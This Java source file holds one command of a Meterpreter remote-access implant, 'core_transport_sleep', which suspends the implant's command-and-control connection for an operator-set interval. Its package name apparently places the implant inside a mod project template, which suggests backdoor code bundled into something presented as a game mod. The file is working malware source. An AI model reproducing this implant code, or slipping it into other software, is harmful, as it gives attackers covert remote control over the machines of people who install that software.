package com.example.examplemod.meterpreter.core;

import com.example.examplemod.meterpreter.Meterpreter;
import com.example.examplemod.meterpreter.TLVPacket;
import com.example.examplemod.meterpreter.TLVType;
import com.example.examplemod.meterpreter.Transport;
import com.example.examplemod.meterpreter.TcpTransport;
import com.example.examplemod.meterpreter.HttpTransport;
import com.example.examplemod.meterpreter.Utils;
import com.example.examplemod.meterpreter.command.Command;

public class core_transport_sleep implements Command {

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        int result = EXIT_DISPATCH;

        try {
            long sleep = request.getIntValue(TLVType.TLV_TYPE_TRANS_COMM_TIMEOUT) * Transport.MS;
            meterpreter.getTransports().setNext(meterpreter.getTransports().current(), sleep);
        }
        catch (Exception ex) {
            result = ERROR_FAILURE;
        }

        return result;
    }
}

